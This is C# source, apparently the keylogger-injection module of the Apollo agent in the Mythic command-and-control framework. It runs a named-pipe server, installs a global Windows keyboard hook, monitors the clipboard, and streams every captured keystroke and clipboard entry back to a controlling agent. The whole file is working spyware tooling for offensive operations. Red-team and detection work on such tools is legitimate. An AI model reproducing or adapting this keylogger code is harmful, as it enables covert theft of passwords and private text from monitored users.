using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using ApolloInterop.Classes.Collections;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Serializers;
using ST=System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using static KeylogInject.Native;
using System.Collections.Concurrent;
using ApolloInterop.Classes;
using System.IO.Pipes;
using ApolloInterop.Interfaces;
using ApolloInterop.Constants;
using ApolloInterop.Structs.MythicStructs;

namespace KeylogInject
{
    class Program
    {
        private static string _namedPipeName;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static AsyncNamedPipeServer _server;
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static CancellationTokenSource _cts = new CancellationTokenSource();

        private static ThreadSafeList<KeylogInformation> _keylogs = new ThreadSafeList<KeylogInformation>();
        private static bool _completed = false;
        private static AutoResetEvent _completeEvent = new AutoResetEvent(false);
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
       

        private static ST.Task _sendTask = null;
        private static Action<object> _sendAction = null;

        private static ST.Task _flushTask = null;
        private static Action _flushAction = null;

        private static IntPtr _hookIdentifier = IntPtr.Zero;
        private static Thread _appRunThread;

        static void Main(string[] args)
        {
#if DEBUG
            _namedPipeName = "keylogtest";
#else
            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];
#endif
            _sendAction = new Action<object>((object p) =>
            {
                PipeStream ps = (PipeStream)p;
                WaitHandle[] waiters = new WaitHandle[]
                {
                    _completeEvent,
                    _senderEvent
                };
                while (!_completed && ps.IsConnected)
                {
                    WaitHandle.WaitAny(waiters, 1000);
                    if (_senderQueue.TryDequeue(out byte[] result))
                    {
                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, ps);
                    }
                }
                ps.Close();
            });
            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.Disconnect += ServerDisconnect;

            _completeEvent.WaitOne();
        }

        private static void StartKeylog()
        {
            ClipboardNotification.LogMessage = AddToSenderQueue;
            Keylogger.LogMessage = AddToSenderQueue;
            Thread t = new Thread(() => Application.Run(new ClipboardNotification()));
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            Keylogger.HookIdentifier = SetHook(Keylogger.HookCallback);
            Application.Run();
        }

        private static void ServerDisconnect(object sender, NamedPipeMessageArgs e)
        {
            UnhookWindowsHookEx(Keylogger.HookIdentifier);
            _completed = true;
            _cts.Cancel();
            Application.Exit();
            _completeEvent.Set();
        }

        private static bool AddToSenderQueue(IMythicMessage msg)
        {
            IPCChunkedData[] parts = _jsonSerializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
            foreach (IPCChunkedData part in parts)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(part)));
            }
            _senderEvent.Set();
            return true;
        }

        private static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
        {
            // We only accept one connection at a time, sorry.
            if (_sendTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _sendTask = new ST.Task(_sendAction, args.Pipe);
            _sendTask.Start();
            Thread t = new Thread(StartKeylog);
            t.Start();
        }
    }
}
